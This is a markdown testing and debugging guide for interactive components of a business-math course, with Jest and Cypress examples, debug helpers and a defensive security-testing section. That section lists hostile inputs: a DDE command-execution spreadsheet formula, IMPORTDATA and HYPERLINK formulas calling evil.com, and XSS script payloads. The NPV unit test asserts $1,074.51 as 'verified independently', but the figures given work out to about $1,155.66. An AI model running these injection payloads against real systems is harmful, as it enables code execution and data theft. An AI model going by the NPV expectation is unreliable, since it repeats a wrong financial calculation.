# Testing and Debugging Guide
**Math for Business Operations: Comprehensive Strategy for Interactive Component Quality Assurance**

*Version 1.0 - Complete testing framework for educational interactive components*

---

## Table of Contents
1. [Testing Strategy Overview](#testing-strategy-overview)
2. [Component-Specific Testing](#component-specific-testing)
3. [Manual Testing Protocols](#manual-testing-protocols)
4. [Automated Testing Setup](#automated-testing-setup)
5. [Debugging Tools and Techniques](#debugging-tools-and-techniques)
6. [Performance Monitoring](#performance-monitoring)
7. [Security Testing](#security-testing)

---

## Testing Strategy Overview

### Multi-Layered Testing Approach
Our testing strategy combines automated and manual testing to ensure reliable, educational, and engaging interactive components:

1. **Unit Testing**: Individual JavaScript functions and component methods
2. **Integration Testing**: Component interactions and data flow
3. **End-to-End Testing**: Complete user workflows and learning scenarios
4. **Performance Testing**: Load times, responsiveness, and memory usage
5. **Accessibility Testing**: Screen reader compatibility and keyboard navigation
6. **Security Testing**: Input validation and safe code execution

### Testing Priorities
1. **Educational Functionality**: Learning objectives must be achievable
2. **Data Integrity**: All calculations and validations must be accurate
3. **User Experience**: Smooth, intuitive interactions that support learning
4. **Performance**: Acceptable speed on typical school network and devices
5. **Accessibility**: Full compliance with educational accessibility standards

---

## Component-Specific Testing

### Spreadsheet Simulator Testing

#### Unit Testing Requirements
```javascript
// Test suite for spreadsheet simulator
describe('Spreadsheet Simulator', () => {
    test('Initialization with presets', () => {
        const container = document.createElement('div');
        container.setAttribute('data-preset', 'ledger');
        
        // Initialize simulator
        const simulator = new SpreadsheetSimulator(container);
        
        expect(simulator.preset).toBe('ledger');
        expect(simulator.rows).toBeGreaterThan(0);
        expect(simulator.cols).toBeGreaterThan(0);
    });
    
    test('Data setting and retrieval', () => {
        const simulator = new SpreadsheetSimulator(container);
        const testData = { 'A1': 'Revenue', 'B1': '=SUM(B2:B5)' };
        
        simulator.setData(testData);
        const retrievedData = simulator.getData();
        
        expect(retrievedData['A1']).toBe('Revenue');
        expect(retrievedData['B1']).toBe('=SUM(B2:B5)');
    });
    
    test('Formula calculation', () => {
        const simulator = new SpreadsheetSimulator(container);
        simulator.setData({
            'B2': 1000,
            'B3': 2000,
            'B4': 1500,
            'B5': 800,
            'B1': '=SUM(B2:B5)'
        });
        
        const result = simulator.getCellValue('B1');
        expect(result).toBe(5300);
    });
});
```

#### Integration Testing Scenarios
- **Multi-simulator coordination**: Multiple spreadsheets on same page don't interfere
- **Data persistence**: Data survives page reloads when required
- **API method chaining**: Complex operations using multiple method calls
- **Error handling**: Graceful response to invalid inputs and formulas

#### Manual Testing Checklist
- [ ] All presets load correctly (ledger, basic, calculator, custom)
- [ ] Cell selection and navigation work with mouse and keyboard
- [ ] Copy/paste functionality preserves formulas and formatting
- [ ] Undo/redo operates correctly for 50+ operations
- [ ] Formula evaluation handles circular references and errors
- [ ] Professional formatting options apply correctly
- [ ] Export functionality preserves all data and formatting

### Financial Calculators Testing

#### Unit Testing Requirements
```javascript
describe('NPV Calculator', () => {
    test('NPV calculation accuracy', () => {
        const calculator = new NPVCalculator();
        const cashFlows = [-10000, 3000, 4000, 5000, 2000];
        const discountRate = 0.10;
        
        const npv = calculator.calculateNPV(cashFlows, discountRate);
        
        // Expected NPV: $1,074.51 (verified independently)
        expect(Math.round(npv * 100) / 100).toBe(1074.51);
    });
    
    test('Investment decision guidance', () => {
        const calculator = new NPVCalculator();
        
        expect(calculator.getRecommendation(1074.51)).toContain('Accept');
        expect(calculator.getRecommendation(-500.25)).toContain('Reject');
        expect(calculator.getRecommendation(0)).toContain('Indifferent');
    });
});

describe('Loan Calculator', () => {
    test('Monthly payment calculation', () => {
        const calculator = new LoanCalculator();
        const principal = 25000;
        const annualRate = 0.06;
        const years = 5;
        
        const payment = calculator.calculatePayment(principal, annualRate, years);
        
        // Expected payment: $483.32 (verified independently)
        expect(Math.round(payment * 100) / 100).toBe(483.32);
    });
});
```

#### Integration Testing Scenarios
- **Cross-calculator validation**: Results from different calculators match when appropriate
- **Spreadsheet integration**: Calculator results populate spreadsheet cells correctly
- **Real-time updates**: Immediate recalculation when inputs change
- **Educational explanations**: Detailed breakdowns update with calculations

#### Manual Testing Checklist
- [ ] All input fields validate properly (positive numbers, reasonable ranges)
- [ ] Calculations update immediately when inputs change
- [ ] Results include both numerical values and business interpretation
- [ ] Educational explanations are accurate and helpful
- [ ] Edge cases handled gracefully (zero values, very large numbers)
- [ ] Mobile interface allows easy input on touch devices

### Drag-and-Drop Exercises Testing

#### Unit Testing Requirements
```javascript
describe('Account Categorization Exercise', () => {
    test('Correct categorization validation', () => {
        const exercise = new AccountCategorizationExercise('test-id');
        
        // Set up correct categorization
        exercise.placeAccount('Cash', 'Assets');
        exercise.placeAccount('Accounts Payable', 'Liabilities');
        exercise.placeAccount('Revenue', 'Revenue');
        
        const result = exercise.checkAnswers();
        
        expect(result.correct).toBe(true);
        expect(result.score).toBe(100);
    });
    
    test('Incorrect categorization feedback', () => {
        const exercise = new AccountCategorizationExercise('test-id');
        
        // Set up incorrect categorization
        exercise.placeAccount('Cash', 'Liabilities'); // Wrong!
        
        const result = exercise.checkAnswers();
        
        expect(result.correct).toBe(false);
        expect(result.feedback).toContain('Cash is an asset');
    });
});
```

#### Integration Testing Scenarios
- **Touch device compatibility**: Drag-and-drop works on tablets and phones
- **Accessibility alternatives**: Keyboard-only users can complete exercises
- **Progress tracking**: Completion status integrates with gamification system
- **Reset functionality**: Exercises can be restarted cleanly

#### Manual Testing Checklist
- [ ] Drag-and-drop works smoothly on desktop with mouse
- [ ] Touch interface functions correctly on tablets and phones
- [ ] Keyboard alternatives allow full completion without mouse
- [ ] Visual feedback indicates valid drop zones and current state
- [ ] Hints provide meaningful guidance without giving away answers
- [ ] Validation provides specific, educational feedback
- [ ] Reset button restores exercise to initial state

### Business Simulations Testing

#### Unit Testing Requirements
```javascript
describe('Lemonade Stand Simulation', () => {
    test('Game initialization', () => {
        const game = new LemonadeStandGame('test-id');
        
        expect(game.cash).toBe(50); // Starting cash
        expect(game.day).toBe(1);
        expect(game.inventory.lemons).toBe(0);
        expect(game.inventory.sugar).toBe(0);
    });
    
    test('Supply purchasing', () => {
        const game = new LemonadeStandGame('test-id');
        
        game.buySupply('lemons', 10, 3); // 10 lemons at $3 total
        
        expect(game.cash).toBe(47); // 50 - 3 = 47
        expect(game.inventory.lemons).toBe(10);
    });
    
    test('Profit calculation', () => {
        const game = new LemonadeStandGame('test-id');
        
        // Set up scenario
        game.inventory.lemons = 20;
        game.inventory.sugar = 10;
        game.price = 0.75;
        
        const dailyResult = game.runDay();
        
        expect(dailyResult.profit).toBeGreaterThan(0);
        expect(dailyResult.customersSatisfied).toBeDefined();
    });
});
```

#### Integration Testing Scenarios
- **Save/load functionality**: Game state persists appropriately
- **Educational connections**: Simulation results connect to unit learning objectives
- **Performance analytics**: Multiple plays generate meaningful data
- **Gamification integration**: Achievements unlock based on simulation performance

#### Manual Testing Checklist
- [ ] Game mechanics are engaging and educational
- [ ] Business logic reflects realistic scenarios
- [ ] Player decisions have meaningful consequences
- [ ] Results connect clearly to unit learning objectives
- [ ] Multiple play sessions provide varied experiences
- [ ] Reset functionality allows fresh starts
- [ ] Performance analytics help students reflect on decisions

### Gamification System Testing

#### Unit Testing Requirements
```javascript
describe('Gamification System', () => {
    test('Point awarding', () => {
        const gamification = new GamificationSystem();
        
        gamification.awardPoints(25, 'Completed introduction');
        
        expect(gamification.totalPoints).toBe(25);
        expect(gamification.recentActivities[0].points).toBe(25);
        expect(gamification.recentActivities[0].reason).toBe('Completed introduction');
    });
    
    test('Level progression', () => {
        const gamification = new GamificationSystem();
        
        // Award enough points for level 2 (100 points)
        gamification.awardPoints(100, 'Test points');
        
        expect(gamification.currentLevel).toBe(2);
        expect(gamification.achievements).toContain('level-2');
    });
    
    test('Achievement unlocking', () => {
        const gamification = new GamificationSystem();
        
        // Simulate perfect quiz score
        gamification.onExerciseComplete(100, true, 'quiz');
        
        expect(gamification.achievements).toContain('perfectionist');
    });
});
```

#### Integration Testing Scenarios
- **Cross-component integration**: All interactive elements award points correctly
- **Data persistence**: Progress maintains across browser sessions
- **Achievement logic**: Complex achievements trigger appropriately
- **Performance impact**: Gamification doesn't slow down other components

#### Manual Testing Checklist
- [ ] Points award correctly for all activities
- [ ] Visual progress indicators update immediately
- [ ] Achievement notifications appear and are meaningful
- [ ] Level progression provides sense of advancement
- [ ] Dashboard shows comprehensive progress overview
- [ ] System encourages continued engagement
- [ ] Data persists appropriately across sessions

---

## Manual Testing Protocols

### Browser Testing Matrix
Test all functionality across:
- **Chrome** (latest version + 1 previous)
- **Firefox** (latest version + 1 previous)  
- **Safari** (latest version on macOS/iOS)
- **Edge** (latest version)

### Device Testing Requirements
- **Desktop**: 1920x1080, 1366x768, 1440x900 resolutions
- **Tablet**: iPad (768x1024), Android tablet (800x1280)
- **Mobile**: iPhone (375x667), Android phone (360x640)

### Network Condition Testing
- **Fast Network**: Cable/fiber internet (>10 Mbps)
- **School Network**: Typical institutional bandwidth (2-5 Mbps)
- **Slow Network**: Mobile/rural connection (<1 Mbps)
- **Offline**: Components that should work without internet

### Accessibility Testing Protocol
1. **Screen Reader Testing**: NVDA (Windows), VoiceOver (macOS), TalkBack (Android)
2. **Keyboard Navigation**: Complete all interactions using only keyboard
3. **Color Contrast**: Verify all text meets WCAG AA standards
4. **Zoom Testing**: 200% zoom maintains functionality and readability

---

## Automated Testing Setup

### Jest Configuration for Unit Testing
```javascript
// jest.config.js
module.exports = {
    testEnvironment: 'jsdom',
    setupFilesAfterEnv: ['<rootDir>/tests/setup.js'],
    collectCoverageFrom: [
        'html/assets/js/**/*.js',
        '!html/assets/js/**/*.test.js'
    ],
    coverageThreshold: {
        global: {
            branches: 75,
            functions: 80,
            lines: 80,
            statements: 80
        }
    }
};
```

### Cypress Configuration for E2E Testing
```javascript
// cypress.config.js
module.exports = {
    e2e: {
        baseUrl: 'http://localhost:8000',
        specPattern: 'cypress/e2e/**/*.cy.js',
        supportFile: 'cypress/support/commands.js',
        viewportWidth: 1280,
        viewportHeight: 720
    }
};
```

### Example E2E Test Scenarios
```javascript
// cypress/e2e/unit-completion.cy.js
describe('Unit Completion Flow', () => {
    it('Completes full unit workflow', () => {
        cy.visit('/html/units/unit01-smart-ledger/intro.html');
        
        // Complete introduction
        cy.get('[data-testid="comprehension-check"]').should('be.visible');
        cy.get('input[name="q1"][value="b"]').check();
        cy.get('button').contains('Check Answers').click();
        cy.get('.feedback.correct').should('be.visible');
        
        // Navigate to concepts
        cy.get('a[href="concepts.html"]').click();
        cy.url().should('include', 'concepts.html');
        
        // Test spreadsheet simulator
        cy.get('.spreadsheet-simulator-container').should('be.visible');
        cy.get('[data-cell="A1"]').click().type('Revenue');
        cy.get('[data-cell="A1"]').should('contain', 'Revenue');
        
        // Continue through all sections...
    });
});
```

---

## Debugging Tools and Techniques

### Browser Developer Tools Setup
1. **Console Monitoring**: Watch for JavaScript errors and warnings
2. **Network Tab**: Monitor loading times and failed requests
3. **Performance Tab**: Identify bottlenecks and memory leaks
4. **Application Tab**: Check local storage and session data

### Custom Debug Console
```javascript
// debug-console.js - Custom debugging tools for development
class DebugConsole {
    constructor() {
        this.enabled = window.location.hostname === 'localhost';
        this.logs = [];
    }
    
    log(component, action, data) {
        if (!this.enabled) return;
        
        const timestamp = new Date().toISOString();
        const logEntry = { timestamp, component, action, data };
        
        this.logs.push(logEntry);
        console.log(`[${component}] ${action}:`, data);
    }
    
    getComponentLogs(component) {
        return this.logs.filter(log => log.component === component);
    }
    
    exportLogs() {
        const blob = new Blob([JSON.stringify(this.logs, null, 2)], 
            { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'debug-logs.json';
        a.click();
    }
}

// Initialize debug console
window.DebugConsole = new DebugConsole();
```

### Component-Specific Debug Helpers
```javascript
// Spreadsheet Simulator Debug Helper
SpreadsheetSimulator.prototype.debugState = function() {
    if (window.DebugConsole) {
        window.DebugConsole.log('SpreadsheetSimulator', 'state', {
            preset: this.preset,
            dataCount: Object.keys(this.data).length,
            selectedCell: this.selectedCell,
            history: this.history.length
        });
    }
};

// Gamification Debug Helper
GamificationSystem.prototype.debugProgress = function() {
    if (window.DebugConsole) {
        window.DebugConsole.log('Gamification', 'progress', {
            points: this.totalPoints,
            level: this.currentLevel,
            achievements: this.achievements.length,
            activities: this.recentActivities.length
        });
    }
};
```

### Error Handling and Reporting
```javascript
// Global error handler for component issues
window.addEventListener('error', (event) => {
    const errorInfo = {
        message: event.message,
        filename: event.filename,
        lineno: event.lineno,
        colno: event.colno,
        stack: event.error?.stack
    };
    
    // Log to debug console
    if (window.DebugConsole) {
        window.DebugConsole.log('Global', 'error', errorInfo);
    }
    
    // Send to error tracking service in production
    if (window.ErrorTracking) {
        window.ErrorTracking.report(errorInfo);
    }
});
```

---

## Performance Monitoring

### Loading Performance Targets
- **Initial Page Load**: <3 seconds on school network
- **Interactive Components**: <500ms to first interaction
- **Large Operations**: <2 seconds for complex calculations
- **Memory Usage**: <50MB per page on mobile devices

### Performance Testing Tools
```javascript
// Performance monitoring utility
class PerformanceMonitor {
    constructor() {
        this.marks = new Map();
        this.measures = new Map();
    }
    
    startTiming(name) {
        performance.mark(`${name}-start`);
        this.marks.set(name, Date.now());
    }
    
    endTiming(name) {
        performance.mark(`${name}-end`);
        performance.measure(name, `${name}-start`, `${name}-end`);
        
        const measure = performance.getEntriesByName(name)[0];
        this.measures.set(name, measure.duration);
        
        if (window.DebugConsole) {
            window.DebugConsole.log('Performance', name, {
                duration: measure.duration,
                threshold: this.getThreshold(name)
            });
        }
    }
    
    getThreshold(name) {
        const thresholds = {
            'page-load': 3000,
            'component-init': 500,
            'calculation': 2000,
            'animation': 16.67 // 60fps
        };
        return thresholds[name] || 1000;
    }
}

window.PerformanceMonitor = new PerformanceMonitor();
```

### Memory Usage Monitoring
```javascript
// Monitor memory usage in development
function checkMemoryUsage() {
    if (performance.memory) {
        const memory = {
            used: Math.round(performance.memory.usedJSHeapSize / 1048576),
            total: Math.round(performance.memory.totalJSHeapSize / 1048576),
            limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576)
        };
        
        if (window.DebugConsole) {
            window.DebugConsole.log('Memory', 'usage', memory);
        }
        
        // Warn if memory usage is high
        if (memory.used > 50) {
            console.warn('High memory usage detected:', memory);
        }
    }
}

// Check memory every 30 seconds in development
if (window.location.hostname === 'localhost') {
    setInterval(checkMemoryUsage, 30000);
}
```

---

## Security Testing

### Input Validation Testing
```javascript
// Test malicious input handling
describe('Security - Input Validation', () => {
    test('Spreadsheet formula injection protection', () => {
        const simulator = new SpreadsheetSimulator(container);
        
        // Attempt various injection attacks
        const maliciousInputs = [
            '=cmd|"/c calc"!A1',
            '=HYPERLINK("http://evil.com","Click")',
            '=IMPORTDATA("http://evil.com/data")',
            '<script>alert("xss")</script>',
            '"><script>alert("xss")</script>'
        ];
        
        maliciousInputs.forEach(input => {
            simulator.setData({ 'A1': input });
            const result = simulator.getCellValue('A1');
            
            // Should not execute as formula or script
            expect(result).not.toContain('calc');
            expect(result).not.toContain('script');
        });
    });
    
    test('Exercise input sanitization', () => {
        const exercise = new AccountCategorizationExercise('test');
        
        const maliciousInputs = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '"><img src=x onerror=alert("xss")>'
        ];
        
        maliciousInputs.forEach(input => {
            exercise.placeAccount(input, 'Assets');
            
            // Should be sanitized
            expect(document.body.innerHTML).not.toContain('<script>');
            expect(document.body.innerHTML).not.toContain('javascript:');
        });
    });
});
```

### Content Security Policy Testing
Verify CSP headers prevent:
- Inline script execution
- External resource loading from unauthorized domains
- eval() and Function() constructor usage
- Unsafe dynamic code execution

### Safe Code Execution
```javascript
// Replace eval() usage with safe alternatives
class SafeFormulaEvaluator {
    constructor() {
        this.allowedFunctions = ['SUM', 'AVERAGE', 'IF', 'MAX', 'MIN'];
        this.allowedOperators = ['+', '-', '*', '/', '(', ')'];
    }
    
    evaluate(formula) {
        // Parse and validate formula before execution
        if (!this.isFormulaSafe(formula)) {
            throw new Error('Unsafe formula detected');
        }
        
        // Use safe mathematical parser instead of eval()
        return this.safeEvaluate(formula);
    }
    
    isFormulaSafe(formula) {
        // Check for dangerous patterns
        const dangerous = ['eval', 'function', 'constructor', 'prototype'];
        return !dangerous.some(pattern => 
            formula.toLowerCase().includes(pattern)
        );
    }
}
```

---

## Testing Implementation Plan

### Phase 1: Critical Component Testing (Week 1)
- [ ] Set up Jest testing framework
- [ ] Create unit tests for spreadsheet simulator
- [ ] Create unit tests for financial calculators
- [ ] Set up basic debugging tools

### Phase 2: Integration Testing (Week 2)
- [ ] Set up Cypress E2E testing
- [ ] Create integration tests for component interactions
- [ ] Implement performance monitoring
- [ ] Create accessibility testing protocol

### Phase 3: Comprehensive Testing (Week 3)
- [ ] Complete browser compatibility testing
- [ ] Implement security testing protocols
- [ ] Create manual testing checklists
- [ ] Set up continuous testing pipeline

### Phase 4: Documentation and Training (Week 4)
- [ ] Create testing documentation for developers
- [ ] Train team on debugging tools and techniques
- [ ] Establish testing procedures for new components
- [ ] Create bug reporting and tracking system

---

*This comprehensive testing and debugging guide ensures all interactive components maintain high quality, reliability, and educational effectiveness while providing developers with the tools and knowledge needed to identify and resolve issues quickly.*